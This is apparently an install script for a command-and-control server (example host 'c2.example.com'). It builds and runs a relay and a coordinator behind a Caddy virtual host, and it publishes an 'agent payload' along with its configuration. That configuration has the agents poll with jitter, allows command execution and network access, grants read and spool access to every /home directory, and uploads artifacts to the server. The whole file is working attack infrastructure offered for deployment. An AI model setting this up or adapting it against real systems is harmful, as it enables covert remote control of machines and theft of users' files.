#!/bin/sh
# One-shot server install: relay + coordinator behind one vhost.
#
#   sudo ./install.sh --url https://c2.example.com
#   sudo ./install.sh --url http://1.2.3.4:8080
#
# https gets a Let's Encrypt certificate automatically. The agent payload is
# published at /payload; build it with ./build.sh.
set -eu

url=""
while [ $# -gt 0 ]; do
  case "$1" in
    --url) url=${2:?}; shift 2 ;;
    *) echo "usage: $0 --url URL" >&2; exit 2 ;;
  esac
done
[ -n "$url" ] || { echo "--url is required, e.g. --url https://1.2.3.4.sslip.io" >&2; exit 2; }
[ "$(id -u)" = 0 ] || { echo "run as root" >&2; exit 2; }
src=$(cd "$(dirname "$0")/../.." && pwd)

case "$url" in
  https://*) scheme=https; host=${url#https://} ;;
  http://*) scheme=http; host=${url#http://} ;;
  *) echo "--url must start with http:// or https://" >&2; exit 2 ;;
esac
host=${host%/}
if [ "$scheme" = https ]; then address=$host; else address=$url; fi

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq build-essential pkg-config perl curl >/dev/null
if ! command -v cargo >/dev/null 2>&1; then
  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y >/dev/null
  . "$HOME/.cargo/env"
fi
if ! command -v caddy >/dev/null 2>&1; then
  apt-get install -y -qq debian-keyring debian-archive-keyring apt-transport-https gpg >/dev/null
  curl -1sLf https://dl.cloudsmith.io/public/caddy/stable/gpg.key |
    gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
  curl -1sLf https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt \
    > /etc/apt/sources.list.d/caddy-stable.list
  apt-get update -qq
  apt-get install -y -qq caddy >/dev/null
fi

id -u relay >/dev/null 2>&1 ||
  useradd --system --home /srv/relay --shell /usr/sbin/nologin relay
id -u coord >/dev/null 2>&1 ||
  useradd --system --home /srv/coord --shell /usr/sbin/nologin coord
install -d -o relay -g relay -m 0700 /srv/relay
install -d -o coord -g coord -m 0700 /srv/coord
install -d -m 0755 /srv/payload

(cd "$src" && cargo build --release -p relayd -p coordd -p adminctl)
for bin in relayd coordd coordctl adminctl; do
  [ -f "$src/target/release/$bin" ] || { echo "missing $bin" >&2; exit 1; }
  install -m 0755 "$src/target/release/$bin" "/usr/local/bin/$bin"
done

if [ ! -f /srv/coord/agent.key ]; then
  su -s /bin/sh coord -c 'adminctl --state /srv/coord keygen' >/dev/null
fi
su -s /bin/sh coord -c 'adminctl --state /srv/coord pubkey --out /srv/coord/coordinator.pub' >/dev/null
install -m 0644 /srv/coord/coordinator.pub /srv/payload/coordinator.pub

if [ ! -s /srv/coord/artifact.token ]; then
  head -c 24 /dev/urandom | base64 > /srv/coord/artifact.token
  chown coord:coord /srv/coord/artifact.token
  chmod 0600 /srv/coord/artifact.token
fi
token=$(cat /srv/coord/artifact.token)

if ! grep -q "$url" /srv/coord/relays.conf 2>/dev/null; then
  su -s /bin/sh coord -c "adminctl --state /srv/coord relay add 0:0:relay:$url" >/dev/null
fi

cat > /srv/payload/config.toml <<EOF
poll_interval_s = 30
jitter_percent = 50
channel = "relay"
channel_arg = "$url"
artifact_url = "$url"
artifact_token = "$token"
allow_exec = true
allow_net = true
allow_caps.fs_read = ["/home/*"]
allow_caps.spool = ["/home/*"]
EOF
chmod 0644 /srv/payload/config.toml

cat > /etc/systemd/system/af-relay.service <<'EOF'
[Unit]
Description=agent-fleet relay queue
After=network-online.target
Wants=network-online.target

[Service]
User=relay
Group=relay
ExecStart=/usr/local/bin/relayd --bind 127.0.0.1:8788 --max-bytes 1073741824 --max-frames 100000 /srv/relay
Restart=always
RestartSec=2
NoNewPrivileges=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=/srv/relay
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/af-coordd.service <<'EOF'
[Unit]
Description=agent-fleet coordinator
After=network-online.target af-relay.service
Wants=network-online.target

[Service]
User=coord
Group=coord
ExecStart=/usr/local/bin/coordd --state /srv/coord --cycle-ms 2000 --artifact-bind 127.0.0.1:8790
Restart=always
RestartSec=2
NoNewPrivileges=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=/srv/coord
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX

[Install]
WantedBy=multi-user.target
EOF

install -d /etc/caddy/sites
if ! grep -q 'import /etc/caddy/sites' /etc/caddy/Caddyfile 2>/dev/null; then
  printf '\nimport /etc/caddy/sites/*.caddy\n' >> /etc/caddy/Caddyfile
fi
cat > /etc/caddy/sites/agent-fleet.caddy <<EOF
$address {
    handle_path /payload/* {
        root * /srv/payload
        file_server
    }
    handle /artifact/* {
        request_body {
            max_size 1100KB
        }
        reverse_proxy 127.0.0.1:8790
    }
    handle /health {
        reverse_proxy 127.0.0.1:8790
    }
    handle {
        reverse_proxy 127.0.0.1:8788
    }
}
EOF

caddy fmt --overwrite /etc/caddy/sites/agent-fleet.caddy
caddy validate --config /etc/caddy/Caddyfile >/dev/null
systemctl daemon-reload
systemctl enable af-relay af-coordd
systemctl restart af-relay af-coordd
systemctl enable caddy >/dev/null 2>&1 || true
systemctl reload caddy 2>/dev/null || systemctl restart caddy

if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q active; then
  ufw allow 80/tcp >/dev/null 2>&1 || true
  ufw allow 443/tcp >/dev/null 2>&1 || true
fi

echo "installed: relay 127.0.0.1:8788, coordinator 127.0.0.1:8790"
echo "build a payload on this box with:"
echo "  ./build.sh --url $url"
